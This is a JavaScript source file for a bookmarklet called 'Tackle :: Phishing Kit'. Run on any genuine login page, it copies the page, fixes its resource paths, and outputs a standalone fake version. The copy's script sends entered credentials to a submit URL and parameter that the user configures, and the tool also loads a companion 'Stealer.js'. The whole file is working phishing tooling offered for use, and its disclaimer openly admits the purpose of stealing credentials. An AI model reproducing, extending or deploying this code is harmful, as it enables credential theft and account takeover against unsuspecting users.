/*
 * javascript:(function(){var x = document.createElement("script");x.id = "phishJS";x.src = "http://localhost/sample/Tackle.js";document.body.appendChild(x);})()
 */
/**
 * This is a bookmarklet script that easily generates a phished page for any genuine login page
 * Just activate this on any login page and get a single file source for the phished page.
 */
var Tackle = 
{
    SCRIPT_ID: "phishJS",
    BASE_URL: "",
    
    /**
     * List of all the tags that have been added to the page for enabling Tackle. These tags have to be removed when the output is to be generated
     */
    addedTags: [],
    
    /**
     * This is the method that is used to submit the credentials to a different server
     */
    phishMethod: _a_,
    
    /**
     * Initial function, responsible for loading dependent scripts and
     * kick starting the main flow
     */
    init: function()
    {
        // checking if the bookmarklet is already loaded
        if (window.isTackleLoaded == true) 
        {
            this.loadDependencies();
        }
        window.isTackleLoaded = true;
        //set the base location of this script so that CSS and other resources are also loaded
        Tackle.BASE_URL = document.getElementById(Tackle.SCRIPT_ID).src;
        Tackle.BASE_URL = Tackle.BASE_URL.substring(0, Tackle.BASE_URL.lastIndexOf("/") + 1);
        
        this.addedTags[this.addedTags.length] = document.getElementById(Tackle.SCRIPT_ID);
        
        // load the YUI Get utility with the basic YAHOO files
        var s = document.createElement("script");
        s.src = "http://yui.yahooapis.com/2.5.2/build/utilities/utilities.js";
        this.addedTags[this.addedTags.length] = s;
        var curObj = this;
        nextFunc = function()
        {
            curObj.loadDependencies.call(curObj);
        }
        s.onreadystatechange = nextFunc;
        s.onload = nextFunc;
        document.body.appendChild(s);
    },
    
    /**
     * Loads the other dependencies
     */
    loadDependencies: function()
    {
        YAHOO.util.Get.css([Tackle.BASE_URL + "Tackle.css"]);
        
        YAHOO.util.Get.script([Tackle.BASE_URL + "Stealer.js"], 
        {
            onSuccess: function(o)
            {
                this.addedTags = this.addedTags.concat(o.nodes);
                this.processPage();
            },
            scope: this,
            autopurge: false
        })
    },
    
    /**
     * Process the login page and main thread to create the
     * phished page
     */
    processPage: function()
    {
        this.setAbsolutePath("script", "src");
        this.setAbsolutePath("input", "src");
        this.setAbsolutePath("link", "href");
        this.setAbsolutePath("img", "src");
        this.setAbsolutePath("a", "href");
        this.setAbsolutePath("form", "action");
        this.correctStyleImports();
        
        /*
         * Once all the paths are corrected, the HTML of the page is saved.
         * This saved version of the page will then be used to generate the phished code
         * without the extra dialogs that this page adds
         */
        this.removeTags();
        this.pageHTML = this.getHTMLCode();
        this.showConfigDialog();
    },
    
    /**
     * Set the absolute path for the tag name / attribute specified
     */
    setAbsolutePath: function(tagName, attr)
    {
        var tagElems = document.getElementsByTagName(tagName);
        
        for (var i = 0; i < tagElems.length; i++) 
        {
            if (tagElems[i][attr]) 
            {
                tagElems[i][attr] = tagElems[i][attr];
            }
        }
        
    },
    
    /**
     * Specifically corrects the style import paths in the page
     */
    correctStyleImports: function()
    {
        /*var styleElem = document.getElementsByTagName("style");
         for (var i = 0; i < styleElem.length; i++)
         {
         var cssText = styleElem[i].innerHTML;
         //parse the entire innerHTML and replace paths with absolute paths
         for (var j = 0; j >= 0 && j < cssText.length; j++)
         {
         j = cssText.indexOf("@import",j);
         j = cssText.indexOf("\"",j);
         console.log(j + " " + cssText.substring(j , cssText.indexOf("\"",j)));
         }
         }*/
    },
    
    /**
     * Shows the output of the Phished page to the user.
     * The user can then copy this output to get the phished page again.
     */
    showConfigDialog: function()
    {
        var s = document.createElement("div");
        s.id = "_t_backgroundMask";
        document.body.appendChild(s);
        
        s = document.createElement("div");
        s.id = "_t_displayDiv"
        var contentHTML = '<div id = "_t_title">' +
        '<div id = "_t_closebutton">&nbsp</div>' +
        '<img id = "_t_help_all" class = "_t_help" style = "float:right"/>' +
        'Tackle :: Phishing Kit</div>' +
        '<h3>Configuration Options</h3><div>URL to submit&nbsp;<img id = "_t_help_url" class = "_t_help"/>&nbsp;: <input id="_t_submitUrl">' +
        '&nbsp;&nbsp;&nbsp;&nbsp;Parameter&nbsp;<img id = "_t_help_param" class = "_t_help"/>&nbsp;: <input id="_t_urlParam"></div>' +
        
        '<br><div>Submit Method&nbsp;&nbsp;: ';
        
        
        for (var i = 0; i < _submitList_.length; i++) 
        {
            contentHTML += '<input type = "radio" name="submitRadio" id = "' + _submitList_[i].func.name;
            contentHTML += '">' + _submitList_[i].name + "&nbsp;<img id = '_t_help"+_submitList_[i].func.name+"' class = '_t_help'/>&nbsp;";
        }
        
        contentHTML += '</div>' +
        '<hr><h3>Output</h3><input id="_t_testButton" type = "button" value = "Test Phished Page">' +
        '&nbsp;&nbsp;&nbsp;OR Copy this HTML code and host it anywhere to see the phished page&nbsp;<img id = "_t_help_copy" class = "_t_help"/><br><br>' +
        '<textarea id = "_t_phishedCode_"></textarea>' +
        '<hr><div id = "_t_warning">Warning : Phishing is generally considered malicious as you are stealing other\'s credentials by tricking them to enter their username and passwords in a site that looks like the real site. Please not that you are solely responsible for the use of this script and the author bears no liability whatsoever. Though you may host fake pages, your IP may still be recorded. By using this script, you acknowledge that you shall are responsible for all things you do with this script</div>';
        
        s.innerHTML = contentHTML;
        document.body.appendChild(s);
        
        // now adding event listeners to the form
        YAHOO.util.Event.addListener("_t_closebutton", "click", this.closeTackle, this, this);
        YAHOO.util.Event.addListener("_t_testButton", "click", this.testPhish, this, this);
		YAHOO.util.Event.addListener("_t_submitUrl", "blur", this.changeParam, this);
		YAHOO.util.Event.addListener("_t_urlParam", "blur", this.changeParam, this);
		
		
        YAHOO.util.Event.addListener("_t_phishedCode_", "click", function()
        {
            this.select()
        }, this);
        
        for (var i = 0; i < _submitList_.length; i++) 
        {
            YAHOO.util.Event.addListener(_submitList_[i].func.name, "click", this.setphishMethod, _submitList_[i].func, this);
        }
        
        // associating event listeners for the help icons
        var helpIcons = YAHOO.util.Dom.getElementsByClassName('_t_help', 'img');
        for (var i = 0; i < helpIcons.length; i++) 
        {
            helpIcons[i].src = 'http://www.thegateway.org/help_icon.gif';
			YAHOO.util.Event.addListener(helpIcons[i],"click", this.showHelp, helpIcons[i].id);
        }
        
        document.getElementById("_t_phishedCode_").value = this.getPhishedPage();
    },
    
    /**
     * Created the phished version of this page. Returns a string that has the phished method of this page
     */
    getPhishedPage: function()
    {
        var result = "<html>";
        result += this.pageHTML;
        result += "<script>" + this.phishMethod.toString();
		result += "\n_submitUrl = '" + this["_t_submitUrl"] + "';\n"
		result += "_submitParam = '" + this["_t_urlParam"] + "';\n"
        result += _tack_.toString() + "\n_tack_(" + this.phishMethod.name + ");</script>";
        result += "</html>"
        return result;
    },
    
    /**
     * Attatches the event listeners to the buttons for testing the page. Opens the page in a new window
     * and mimics the actual page
     */
    testPhish: function()
    {
        var area = this.getPhishedPage();
        var win = window.open("", "win", "scrollbars,resizable,width=620,height=370");
        win.document.write(area);
        win.document.close();
    },
    
    /**
     * Sets the method to submit the current form
     */
    setphishMethod: function(e, method)
    {
        this.phishMethod = method;
        document.getElementById("_t_phishedCode_").value = this.getPhishedPage();
    },
    
	/**
	 * The parameters that are to be used for phishing have changed
	 */
	changeParam : function(e, param)
	{
		param[this.id] = this.value;
		document.getElementById("_t_phishedCode_").value = param.getPhishedPage();
	},
	
    /**
     * Removes all traces of Tackle, the tags, etc
     */
    closeTackle: function()
    {
        this.removeTags();
        window.isTackleLoaded = false;
        var tag = document.getElementById("_t_displayDiv");
        tag.parentNode.removeChild(tag);
        var tag = document.getElementById("_t_backgroundMask");
        tag.parentNode.removeChild(tag);
    },
    
    /**
     * Removes a tag from the current page
     */
    removeTags: function()
    {
        for (var i = 0; i < this.addedTags.length; i++) 
        {
            var tag = this.addedTags[i];
			if (tag) 
			{
				tag.parentNode.removeChild(tag);
			}
        }
        this.addedTags = [];
    },
    
    /**
     * Gets  the actual HTML code
     * @param {Object} object
     * @param {Object} 1 to show a message box
     * @param {Object} should we show HTML or not
     * @param {Object} new line corrention
     */
    getHTMLCode: function(object, print, stripTags, nl2)
    {
        object = (!object) ? self : (typeof(object) == "string") ? document.getElementById(object) : object;
        if (!object.childNodes) 
        {/*object was a window or frame - this bypasses id of empty tags*/
            object = object.document.getElementsByTagName('HTML');
            if (!object) 
            {
                object = object.document.getElementsByTagName('BODY');
            };
            if (!object) 
            {
                return "";
            };/*no such nodeName tag*/
            object = object[0].innerHTML;
        }
        else 
        {/*object was a DOM node*/
            object = object.innerHTML;
        };
        //
        if (stripTags) 
        {
            object = object.replace(/<\/?(br|p|div|[ou]l|li|hr).*?>/gi, "\n");
            object = object.replace(/<[^>]+>/g, '');//not earlier
            object = object.replace(/ /gi, ' ');
        };
        if (nl2) 
        {
            object = object.replace(/(\s*\r?\n\s*){3,}/g, "\n\n");
        };//not earlier
        return object;
        /* keep this comment to reuse freely: http://www.fullposter.com/?1 */
    },
	
	/**
	 * Shows help for individual features
	 * @param {Object} id
	 */
	showHelp : function(e,id)
	{
		console.log(id);
		window.open("http://dy-verse.blogspot.com/search/label/tackle#"+id);
	}
}

Tackle.init();
function _a_()
{
    alert("This is the default function, change it");
}
